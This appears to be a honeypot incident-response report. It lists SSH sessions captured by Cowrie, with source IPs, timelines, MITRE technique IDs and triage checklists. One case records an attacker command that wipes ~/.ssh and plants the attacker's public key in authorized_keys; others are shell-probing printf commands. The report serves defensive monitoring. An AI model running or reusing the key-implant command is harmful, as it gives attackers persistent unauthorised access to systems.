| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-11-01 03:45 |
| **Last Seen** | 2026-11-01 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:45:16` | `cowrie.session.connect` |
| `2026-11-01 03:45:16` | `cowrie.client.version` |
| `2026-11-01 03:45:17` | `cowrie.client.kex` |
| `2026-11-01 03:45:18` | `cowrie.login.success` |
| `2026-11-01 03:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5db4dd094fbe

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-11-01 03:49 |
| **Last Seen** | 2026-11-01 03:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:49:00` | `cowrie.session.connect` |
| `2026-11-01 03:49:00` | `cowrie.client.version` |
| `2026-11-01 03:49:00` | `cowrie.client.kex` |
| `2026-11-01 03:49:01` | `cowrie.login.success` |
| `2026-11-01 03:49:01` | `cowrie.session.params` |
| `2026-11-01 03:49:01` | `cowrie.command.input` |
| `2026-11-01 03:49:01` | `cowrie.command.failed` |
| `2026-11-01 03:49:01` | `cowrie.log.closed` |
| `2026-11-01 03:49:02` | `cowrie.session.params` |
| `2026-11-01 03:49:02` | `cowrie.command.input` |
| `2026-11-01 03:49:02` | `cowrie.session.file_download` |
| `2026-11-01 03:49:02` | `cowrie.log.closed` |
| `2026-11-01 03:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660430ccd6e4

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-11-01 03:49 |
| **Last Seen** | 2026-11-01 03:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:49:02` | `cowrie.session.connect` |
| `2026-11-01 03:49:02` | `cowrie.client.version` |
| `2026-11-01 03:49:02` | `cowrie.client.kex` |
| `2026-11-01 03:49:03` | `cowrie.login.success` |
| `2026-11-01 03:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443423c8b697

| Field | Detail |
|---|---|
| **Source IP** | `35.210.136[.]244` |
| **First Seen** | 2026-11-01 04:00 |
| **Last Seen** | 2026-11-01 04:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:00:19` | `cowrie.session.connect` |
| `2026-11-01 04:00:19` | `cowrie.login.success` |
| `2026-11-01 04:00:20` | `cowrie.session.params` |
| `2026-11-01 04:00:20` | `cowrie.command.input` |
| `2026-11-01 04:00:20` | `cowrie.command.input` |
| `2026-11-01 04:00:20` | `cowrie.command.failed` |
| `2026-11-01 04:00:20` | `cowrie.command.input` |
| `2026-11-01 04:00:20` | `cowrie.log.closed` |
| `2026-11-01 04:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.136[.]244` to AbuseIPDB if not already reported
- [ ] Block `35.210.136[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11bfda5bd3b6

| Field | Detail |
|---|---|
| **Source IP** | `35.210.136[.]244` |
| **First Seen** | 2026-11-01 04:00 |
| **Last Seen** | 2026-11-01 04:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:00:28` | `cowrie.session.connect` |
| `2026-11-01 04:00:28` | `cowrie.login.success` |
| `2026-11-01 04:00:29` | `cowrie.session.params` |
| `2026-11-01 04:00:29` | `cowrie.command.input` |
| `2026-11-01 04:00:29` | `cowrie.command.failed` |
| `2026-11-01 04:00:40` | `cowrie.log.closed` |
| `2026-11-01 04:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.136[.]244` to AbuseIPDB if not already reported
- [ ] Block `35.210.136[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827dae581f39

| Field | Detail |
|---|---|
| **Source IP** | `35.210.136[.]244` |
| **First Seen** | 2026-11-01 04:00 |
| **Last Seen** | 2026-11-01 04:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:00:30` | `cowrie.session.connect` |
| `2026-11-01 04:00:30` | `cowrie.login.success` |
| `2026-11-01 04:00:31` | `cowrie.session.params` |
| `2026-11-01 04:00:31` | `cowrie.command.input` |
| `2026-11-01 04:00:40` | `cowrie.log.closed` |
| `2026-11-01 04:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.136[.]244` to AbuseIPDB if not already reported
- [ ] Block `35.210.136[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94f317582867

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-01 04:13 |
| **Last Seen** | 2026-11-01 04:14 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_adf2b1196dad7f2e8674fbeb39804bfa_small_control'"'"' '"'"'check_adf2b1196dad7f2e8674fbeb39804bfa'"'"'', printf '\n%s|%s\n' 'check_adf2b1196dad7f2e8674fbeb39804bfa_small_control' 'check_adf2b1196dad7f2e8674fbeb39804bfa', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_adf2b1196dad7f2e8674fbeb39804bfa_small_math'"'"' "$((663*743+8))"', (663*743+8, printf '\n%s|%s\n' 'check_adf2b1196dad7f2e8674fbeb39804bfa_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:13:26` | `cowrie.session.connect` |
| `2026-11-01 04:13:27` | `cowrie.client.version` |
| `2026-11-01 04:13:27` | `cowrie.client.kex` |
| `2026-11-01 04:13:30` | `cowrie.login.success` |
| `2026-11-01 04:13:32` | `cowrie.client.size` |
| `2026-11-01 04:13:33` | `cowrie.session.params` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| `2026-11-01 04:13:33` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9645a336537

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-01 04:14 |
| **Last Seen** | 2026-11-01 04:14 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0b962d4c58cb376dea916d78a3de1ebd_small_control'"'"' '"'"'check_0b962d4c58cb376dea916d78a3de1ebd'"'"'', printf '\n%s|%s\n' 'check_0b962d4c58cb376dea916d78a3de1ebd_small_control' 'check_0b962d4c58cb376dea916d78a3de1ebd', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0b962d4c58cb376dea916d78a3de1ebd_small_math'"'"' "$((973*696+57))"', (973*696+57, printf '\n%s|%s\n' 'check_0b962d4c58cb376dea916d78a3de1ebd_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:14:12` | `cowrie.session.connect` |
| `2026-11-01 04:14:13` | `cowrie.client.version` |
| `2026-11-01 04:14:14` | `cowrie.client.kex` |
| `2026-11-01 04:14:39` | `cowrie.login.success` |
| `2026-11-01 04:14:43` | `cowrie.client.size` |
| `2026-11-01 04:14:45` | `cowrie.session.params` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| `2026-11-01 04:14:48` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ffd29e1313

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-01 04:15 |
| **Last Seen** | 2026-11-01 04:16 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ce1a3a3549f26cd38671e5f881d35c41_small_control'"'"' '"'"'check_ce1a3a3549f26cd38671e5f881d35c41'"'"'', printf '\n%s|%s\n' 'check_ce1a3a3549f26cd38671e5f881d35c41_small_control' 'check_ce1a3a3549f26cd38671e5f881d35c41', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ce1a3a3549f26cd38671e5f881d35c41_small_math'"'"' "$((919*37+92))"', (919*37+92, printf '\n%s|%s\n' 'check_ce1a3a3549f26cd38671e5f881d35c41_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:15:15` | `cowrie.session.connect` |
| `2026-11-01 04:15:16` | `cowrie.client.version` |
| `2026-11-01 04:15:16` | `cowrie.client.kex` |
| `2026-11-01 04:15:17` | `cowrie.login.success` |
| `2026-11-01 04:15:19` | `cowrie.client.size` |
| `2026-11-01 04:15:20` | `cowrie.session.params` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| `2026-11-01 04:15:20` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b4711c4215c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-01 04:17 |
| **Last Seen** | 2026-11-01 04:17 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3289f9aba8e40d2f6998b6f074fb0cd8_small_control'"'"' '"'"'check_3289f9aba8e40d2f6998b6f074fb0cd8'"'"'', printf '\n%s|%s\n' 'check_3289f9aba8e40d2f6998b6f074fb0cd8_small_control' 'check_3289f9aba8e40d2f6998b6f074fb0cd8', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3289f9aba8e40d2f6998b6f074fb0cd8_small_math'"'"' "$((974*492+37))"', (974*492+37, printf '\n%s|%s\n' 'check_3289f9aba8e40d2f6998b6f074fb0cd8_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:17:08` | `cowrie.session.connect` |
| `2026-11-01 04:17:08` | `cowrie.client.version` |
| `2026-11-01 04:17:08` | `cowrie.client.kex` |
| `2026-11-01 04:17:10` | `cowrie.login.success` |
| `2026-11-01 04:17:12` | `cowrie.client.size` |
| `2026-11-01 04:17:12` | `cowrie.session.params` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| `2026-11-01 04:17:13` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7660693b290

| Field | Detail |
|---|---|
| **Source IP** | `125.39.148[.]106` |
| **First Seen** | 2026-11-01 04:17 |
| **Last Seen** | 2026-11-01 04:23 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:17:58` | `cowrie.session.connect` |
| `2026-11-01 04:17:58` | `cowrie.client.version` |
| `2026-11-01 04:17:58` | `cowrie.client.kex` |
| `2026-11-01 04:18:02` | `cowrie.login.success` |
| `2026-11-01 04:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.148[.]106` to AbuseIPDB if not already reported
- [ ] Block `125.39.148[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8599e887906b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-01 04:18 |
| **Last Seen** | 2026-11-01 04:19 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_679a4bb120ec1ccc1660c6ec5a34850e_small_control'"'"' '"'"'check_679a4bb120ec1ccc1660c6ec5a34850e'"'"'', printf '\n%s|%s\n' 'check_679a4bb120ec1ccc1660c6ec5a34850e_small_control' 'check_679a4bb120ec1ccc1660c6ec5a34850e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_679a4bb120ec1ccc1660c6ec5a34850e_small_math'"'"' "$((601*549+42))"', (601*549+42, printf '\n%s|%s\n' 'check_679a4bb120ec1ccc1660c6ec5a34850e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:18:37` | `cowrie.session.connect` |
| `2026-11-01 04:18:42` | `cowrie.client.version` |
| `2026-11-01 04:18:42` | `cowrie.client.kex` |
| `2026-11-01 04:19:10` | `cowrie.login.success` |
| `2026-11-01 04:19:13` | `cowrie.client.size` |
| `2026-11-01 04:19:15` | `cowrie.session.params` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| `2026-11-01 04:19:17` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-281fb495df8e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-11-01 04:22 |
| **Last Seen** | 2026-11-01 04:26 |
| **Session Duration** | 253s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4548daa3f47162854b557d580b55d625_small_control'"'"' '"'"'check_4548daa3f47162854b557d580b55d625'"'"'', printf '\n%s|%s\n' 'check_4548daa3f47162854b557d580b55d625_small_control' 'check_4548daa3f47162854b557d580b55d625', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4548daa3f47162854b557d580b55d625_small_math'"'"' "$((788*476+83))"', (788*476+83, printf '\n%s|%s\n' 'check_4548daa3f47162854b557d580b55d625_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 04:22:44` | `cowrie.session.connect` |
| `2026-11-01 04:22:45` | `cowrie.client.version` |
| `2026-11-01 04:22:45` | `cowrie.client.kex` |
| `2026-11-01 04:23:15` | `cowrie.login.success` |
| `2026-11-01 04:23:21` | `cowrie.client.size` |
| `2026-11-01 04:23:21` | `cowrie.session.params` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| `2026-11-01 04:23:22` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (165) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-4c6fef9e739c | HIGH | `36.133.118[.]11` | 2026-11-01 04:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8beb06649718 | HIGH | `193.32.162[.]84` | 2026-11-01 04:27 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d4113f615161 | HIGH | `193.32.162[.]84` | 2026-11-01 04:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b856a547372f | HIGH | `193.32.162[.]84` | 2026-11-01 04:36 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cb6ff09dbb51 | HIGH | `184.105.139[.]69` | 2026-11-01 04:36 | Y | 3 | 0 | `T1078` |
| IR-e031354aa49c | HIGH | `193.32.162[.]84` | 2026-11-01 04:38 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-69c57fd1f58a | HIGH | `193.32.162[.]84` | 2026-11-01 04:41 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bb2516347459 | HIGH | `138.226.239[.]233` | 2026-11-01 04:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f0ab796d57dc | HIGH | `45.79.207[.]181` | 2026-11-01 04:44 | Y | 3 | 0 | `T1078` |
| IR-e6fe3286d6b2 | HIGH | `193.32.162[.]84` | 2026-11-01 04:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fdc9782af465 | HIGH | `35.206.183[.]188` | 2026-11-01 04:47 | Y | 2 | 0 | `T1078` |
| IR-9fa46e61064b | HIGH | `35.206.183[.]188` | 2026-11-01 04:47 | Y | 1 | 0 | `T1078` |
| IR-860c5981f5ab | HIGH | `35.206.183[.]188` | 2026-11-01 04:47 | Y | 0 | 0 | `T1078` |
| IR-8b5ad503d781 | HIGH | `193.32.162[.]84` | 2026-11-01 04:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1105` |
| IR-588cdf3afed5 | HIGH | `80.94.95[.]118` | 2026-11-01 05:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6d61e69b7d28 | HIGH | `39.109.57[.]179` | 2026-11-01 05:09 | Y | 1 | 0 | `T1078` |
| IR-ce2e2ded207f | HIGH | `138.226.239[.]234` | 2026-11-01 05:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6c4160b64650 | HIGH | `195.178.110[.]218` | 2026-11-01 05:15 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b0ddd198c20f | HIGH | `176.53.159[.]196` | 2026-11-01 05:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d0e4e212ee59 | HIGH | `189.244.107[.]78` | 2026-11-01 05:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2fca7ae85ad2 | HIGH | `189.244.107[.]78` | 2026-11-01 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74b87151780c | HIGH | `37.187.35[.]26` | 2026-11-01 05:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ee9242ecf9fc | HIGH | `37.187.35[.]26` | 2026-11-01 05:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-61b830d837f2 | HIGH | `35.210.54[.]75` | 2026-11-01 05:47 | Y | 2 | 0 | `T1078` |
| IR-5d542fee16c5 | HIGH | `35.210.54[.]75` | 2026-11-01 05:47 | Y | 1 | 0 | `T1078` |
| IR-75b9e919fb6e | HIGH | `35.210.54[.]75` | 2026-11-01 05:47 | Y | 0 | 0 | `T1078` |
| IR-98824a21eeac | HIGH | `197.248.8[.]33` | 2026-11-01 05:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bd8426192d69 | HIGH | `197.248.8[.]33` | 2026-11-01 05:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7cc99c1bf016 | HIGH | `172.235.41[.]44` | 2026-11-01 05:54 | Y | 3 | 0 | `T1078` |
| IR-4faa3cb362bf | HIGH | `195.178.110[.]218` | 2026-11-01 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9cc600ff7fbd | HIGH | `193.32.162[.]15` | 2026-11-01 06:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc826f5b14e9 | HIGH | `35.210.82[.]106` | 2026-11-01 06:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1f637d89b83a | HIGH | `176.65.132[.]216` | 2026-11-01 06:14 | Y | 0 | 0 | `T1078` |
| IR-04f57f193e9a | HIGH | `103.143.231[.]24` | 2026-11-01 06:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-73756b831ef3 | HIGH | `103.143.231[.]24` | 2026-11-01 06:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f5ff7864cb05 | HIGH | `184.168.21[.]211` | 2026-11-01 06:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f3bac397c644 | HIGH | `184.168.21[.]211` | 2026-11-01 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b94ae051800d | HIGH | `65.254.93[.]170` | 2026-11-01 06:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7294f7c0132c | HIGH | `65.254.93[.]170` | 2026-11-01 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-66e94ae8a61d | HIGH | `163.7.4[.]109` | 2026-11-01 06:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2b5cdce4595a | HIGH | `163.7.4[.]109` | 2026-11-01 06:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e93205fa060 | HIGH | `101.47.158[.]56` | 2026-11-01 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e7bdfcede828 | HIGH | `101.47.158[.]56` | 2026-11-01 06:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ef04bdc3fa83 | HIGH | `143.20.154[.]71` | 2026-11-01 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-69b044cae7c0 | HIGH | `143.20.154[.]71` | 2026-11-01 06:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3fbfeda9b160 | HIGH | `129.121.143[.]242` | 2026-11-01 06:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3c07515d6da3 | HIGH | `119.96.158[.]238` | 2026-11-01 06:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-28d5f91926ce | HIGH | `129.121.143[.]242` | 2026-11-01 06:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b79df45c0c25 | HIGH | `49.213.52[.]29` | 2026-11-01 06:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-09308a5fb456 | HIGH | `49.213.52[.]29` | 2026-11-01 06:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-da1ca70346ac | HIGH | `182.44.4[.]202` | 2026-11-01 06:31 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-e59f94704795 | HIGH | `135.125.235[.]107` | 2026-11-01 06:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c31f8b1bcfe | HIGH | `135.125.235[.]107` | 2026-11-01 06:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-42fcfbc686c3 | HIGH | `69.6.215[.]53` | 2026-11-01 06:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-56e25e8213e7 | HIGH | `69.6.215[.]53` | 2026-11-01 06:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9b8f744fb0ff | HIGH | `45.64.75[.]227` | 2026-11-01 06:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-11f00c82541e | HIGH | `45.64.75[.]227` | 2026-11-01 06:32 | Y | 0 | 0 | `T1078 · T1592` |
